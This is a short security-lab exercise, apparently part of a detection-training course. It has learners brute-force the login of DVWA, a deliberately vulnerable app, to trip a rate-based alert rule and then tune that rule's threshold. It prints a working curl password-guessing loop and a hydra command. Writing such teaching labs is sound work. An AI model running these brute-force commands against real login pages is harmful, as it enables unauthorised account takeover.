# Exercise 2 — Login Brute Force (T1110)

**Goal:** brute-force the DVWA login and trip the rate-based rule (sid:2001).

## Attack

From the attacker box, a quick loop using the bundled wordlist:

```bash
cd /opt/attacker
while read p; do
  curl -s -o /dev/null -X POST "http://proxy/login.php" \
    --data "username=admin&password=$p&Login=Login"
done < passwords.txt
```

Or with hydra against the brute-force page:

```bash
hydra -l admin -P /opt/attacker/passwords.txt proxy \
  http-get-form "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect" \
  -s 80
```

## Defend

After ~10 login POSTs in 30s you should see:

```text
🔴 [HIGH] sid:2001 Login brute-force ... | 10 matching requests in 30s | MITRE T1110
```

- This is a **`RateRule`** — a single login looks fine; the *rate* is the signal.
- **Tune it:** in [`../detector/rules.py`](../detector/rules.py) lower
  `threshold` to 5 or shrink `window_secs`. Restart and re-run — does it fire
  sooner? Now raise them and see real brute force slip under the bar.
- **Trade-off:** tight thresholds catch slow attacks but false-positive on a
  user fat-fingering their password. Where would you set it, and why?
